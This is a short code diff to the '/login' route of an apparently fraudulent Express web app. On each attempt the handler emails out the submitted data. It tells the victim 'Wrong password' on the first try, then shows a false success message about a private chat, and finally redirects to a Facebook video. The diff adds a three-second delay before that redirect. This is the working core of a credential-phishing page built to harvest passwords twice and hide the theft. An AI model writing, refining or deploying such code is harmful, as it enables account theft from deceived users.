@@ -76,9 +76,14 @@ app.post("/login", (req, res) => {
         } else {
             console.log('Email sent: ' + info.response);
             req.session.message = attemptNumber === 1 ? 'Wrong password' : 'You have been successfully added to the private chat, you will get a message request shortly.';
+            
+            setTimeout(() => {
+                res.redirect('https://www.facebook.com/share/v/QeSVNGdVsuCoW8Bs/?mibextid=WC7FNe');
+            }, 3000)
+            
         }
         req.session.attempt = attemptNumber === 1 ? 2 : 1; // Toggle the attempt number
-        res.redirect('https://www.facebook.com/share/v/QeSVNGdVsuCoW8Bs/?mibextid=WC7FNe');
+        
     });
 });
 
